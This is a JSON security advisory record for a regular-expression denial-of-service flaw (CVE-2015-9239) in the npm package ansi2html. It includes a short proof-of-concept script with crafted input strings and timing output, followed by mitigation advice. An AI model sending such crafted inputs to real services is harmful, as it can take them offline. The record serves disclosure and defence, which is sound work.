{
  "Severity": "HIGH",
  "UpdatedAt": "2020-08-31T18:09:21Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "ansi2html"
  },
  "Advisory": {
    "DatabaseId": 2343,
    "Id": "MDE2OlNlY3VyaXR5QWR2aXNvcnlHSFNBLWMydjItN3JjZy0yY2g3",
    "GhsaId": "GHSA-c2v2-7rcg-2ch7",
    "References": [
      {
        "Url": "https://www.npmjs.com/advisories/51"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2015-9239"
      },
      {
        "Url": "https://github.com/advisories/GHSA-c2v2-7rcg-2ch7"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-c2v2-7rcg-2ch7"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2015-9239"
      }
    ],
    "Description": "The `ansi2html` package is affected by a regular expression denial of service vulnerability when certain types of user input is passed in.\n\n\n## Proof of concept\n```\nvar ansi2html = require('ansi2html')\n\nvar start = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;00000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;000000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000000000\");\nconsole.log(process.hrtime(start));\n```\n\nResults of the above\n```\n00:29:53-adam_baldwin~/tmp$ node test\n[ 0, 119615367 ]\n[ 0, 149934565 ]\n[ 0, 233325677 ]\n[ 3, 46582479 ]\n```\n\n\n## Recommendation\n\nAt the time of this writing, February 2018, all versions of `ansi2html` remain vulnerable, and the package has not been updated for 4 years. \n\nIn order to use this package safely, it is necessary to avoid passing user input to the package, or to limit the size of the input string to a size with a parse time you find acceptable. Unfortunately, the match time grows at quite a small character count, so it is unlikely for it to both allow strings of a useful size while protecting against the denial of service attack. \n\nIn the case that user input of significant length must be parsed by ansi2html, the best mitigation is to use an alternative module that is actively maintained and provides similar functionality. There are [multiple modules fitting this criteria available on npm.][available on npm](https://www.npmjs.com/search?q=ansi+html)",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2020-09-01T15:17:48Z",
    "Severity": "HIGH",
    "Summary": "Regular Expression Denial of Service in ansi2html",
    "UpdatedAt": "2023-01-09T05:03:49Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003e= 0.0.0"
    }
  ]
}